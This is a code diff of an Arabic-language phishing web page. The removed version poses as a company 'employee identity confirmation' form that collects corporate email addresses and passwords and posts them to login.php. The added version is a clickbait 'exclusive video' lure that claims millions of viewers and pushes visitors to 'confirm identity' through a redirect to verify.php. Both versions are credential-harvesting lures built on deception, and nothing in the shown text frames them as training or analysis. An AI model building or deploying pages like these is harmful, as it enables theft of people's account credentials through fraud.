@@ -2,58 +2,87 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تأكيد هوية الموظف</title>
+    <title>شاهد الفيديو الحصري</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            background: #f5f5f5;
             margin: 0;
+            padding: 0;
         }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
-            width: 350px;
+        .header {
+            background: #1a1a2e;
+            color: white;
+            padding: 20px;
             text-align: center;
         }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
         }
-        button {
-            background: #007bff;
+        .video-placeholder {
+            background: #000;
+            height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 5px;
-            width: 100%;
+            font-size: 24px;
             cursor: pointer;
         }
-        .logo {
-            font-size: 24px;
+        .content {
+            padding: 30px;
+        }
+        .title {
+            font-size: 28px;
             font-weight: bold;
-            color: #007bff;
+            margin-bottom: 20px;
+        }
+        .description {
+            color: #666;
+            line-height: 1.8;
+        }
+        .verify-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: #e74c3c;
+            color: white;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            margin-top: 30px;
+            cursor: pointer;
+        }
+        .verify-button:hover {
+            background: #c0392b;
         }
     </style>
 </head>
 <body>
+    <div class="header">
+        <h2>📺 منصة المشاهدة الحصرية</h2>
+    </div>
     <div class="container">
-        <div class="logo">✅ شركة الخدمات</div>
-        <h3>تأكيد هوية الموظف</h3>
-        <p style="color: gray; font-size: 14px;">مطلوب من جميع الموظفين تحديث بياناتهم</p>
-        <form method="POST" action="login.php">
-            <input type="email" name="email" placeholder="البريد الإلكتروني للشركة" required>
-            <input type="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit">تأكيد الهوية</button>
-        </form>
+        <div class="video-placeholder" onclick="alert('يرجى تأكيد هويتك أولاً')">
+            🎬 اضغط للمشاهدة
+        </div>
+        <div class="content">
+            <div class="title">فيديو حصري: لن تصدق ما حدث!</div>
+            <div class="description">
+                هذا الفيديو يتابعه أكثر من 5 ملايين شخص. للتأكد من أنك لست روبوتاً، 
+                يرجى تأكيد هويتك من خلال الضغط على الزر أدناه.
+            </div>
+            <button class="verify-button" onclick="window.location.href='verify.php'">
+                🔐 تأكيد الهوية لمشاهدة الفيديو
+            </button>
+        </div>
     </div>
 </body>
 </html>
